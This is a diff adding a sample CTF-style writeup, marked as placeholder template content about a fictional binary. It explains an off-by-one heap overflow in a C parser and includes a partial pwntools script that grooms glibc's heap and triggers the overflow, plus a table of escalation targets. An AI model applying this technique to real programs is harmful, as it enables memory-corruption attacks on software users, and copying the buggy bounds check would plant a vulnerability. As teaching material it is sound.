@@ -1,0 +1,116 @@
+---
+title: "An off-by-one in a length-prefixed parser, and the write it buys"
+event: "Sample content"
+category: "pwn"
+date: "2026-07-22"
+author: "PLACEHOLDER — replace with the operator who wrote this"
+summary: "A single-byte overflow into a heap chunk header, escalated to a controlled write through unlink. Written as a layout sample, not as a record of a real challenge."
+tags: ["pwn", "heap", "rev"]
+sample: true
+---
+
+> **This is sample content.** It exists so the writeup template, code
+> highlighting and typography can be reviewed before the team publishes real
+> material. The binary described here is fictional. Replace this file with an
+> actual writeup and delete the `sample: true` frontmatter flag.
+
+## The bug
+
+The parser reads a length prefix, allocates that many bytes, then copies until
+it sees a terminator — the classic disagreement between "how much did I
+allocate" and "how much am I willing to write".
+
+```c
+static int read_record(int fd, record_t *out) {
+    uint8_t len;
+    if (read(fd, &len, 1) != 1) return -1;
+
+    out->data = malloc(len);          /* len bytes */
+    if (!out->data) return -1;
+
+    /* <= is the bug: writes len + 1 bytes into a len-byte allocation. */
+    for (size_t i = 0; i <= len; i++) {
+        if (read(fd, &out->data[i], 1) != 1) return -1;
+        if (out->data[i] == RECORD_TERM) break;
+    }
+    return 0;
+}
+```
+
+`i <= len` writes one byte past the end. With glibc's allocator, that byte
+lands in the size field of the following chunk.
+
+## Turning one byte into a primitive
+
+A single byte is only useful if you control what it overwrites and what the
+allocator does with it afterwards. The layout below arranges for the
+overflowed byte to clear the `PREV_INUSE` bit of the next chunk, which makes
+`free()` believe the preceding chunk is available for consolidation.
+
+```
+   heap
+   ┌──────────────┬──────────────┬──────────────┐
+   │  A (victim)  │  B (target)  │  C (guard)   │
+   │  0x60 bytes  │  0x60 bytes  │  0x60 bytes  │
+   └──────────────┴──────────────┴──────────────┘
+                  ▲
+                  └─ our single-byte write lands here, in B's size field
+```
+
+Grooming the heap into that shape is most of the work. The allocation sizes
+are chosen so every request is serviced from the tcache until we deliberately
+exhaust it:
+
+```python
+from pwn import *
+
+io = process("./parser")
+
+def record(payload: bytes, length: int | None = None):
+    """Send one length-prefixed record. length defaults to len(payload)."""
+    io.send(bytes([length if length is not None else len(payload)]))
+    io.send(payload)
+
+# Fill the tcache for this size class so the next free reaches the unsorted bin.
+for _ in range(7):
+    record(b"A" * 0x58)
+
+record(b"B" * 0x58)                 # A — the chunk we will overflow out of
+record(b"C" * 0x58)                 # B — the chunk whose header we corrupt
+record(b"D" * 0x58)                 # C — guard, keeps top chunk out of it
+
+# The overflow: 0x58 bytes of data, declared as 0x58, writes 0x59.
+record(b"E" * 0x58 + b"\x00", length=0x58)
+```
+
+## Escalation
+
+With `PREV_INUSE` cleared and a forged `prev_size`, freeing B makes the
+allocator walk backwards into a chunk we control the header of, and the
+resulting unlink gives a write of a heap pointer to an address of our
+choosing.
+
+From there the usual routes are open — the exact one depends on what the
+binary offers:
+
+| Target | Requires | Notes |
+|---|---|---|
+| `__free_hook` | glibc < 2.34 | Simplest, if the version cooperates |
+| `_IO_2_1_stdout_` vtable | FSOP gadget | Survives hook removal |
+| Saved return address | Known stack leak | Needs a second primitive |
+
+On this target the binary leaks a libc address in an error path, so the stack
+route is available and the exploit finishes there.
+
+## What is worth taking away
+
+Two things.
+
+The first is that `<=` in a bounds check is worth grepping for by hand. Static
+analysers flag some instances of it; the ones that survive into production are
+usually the ones where the loop also has an early `break`, which makes the
+overflow conditional and the tooling quiet.
+
+The second is that heap grooming is where the time goes, not the primitive.
+The bug was one character. Reaching a deterministic layout that turns it into
+a controlled write took an order of magnitude longer, and that ratio is normal.
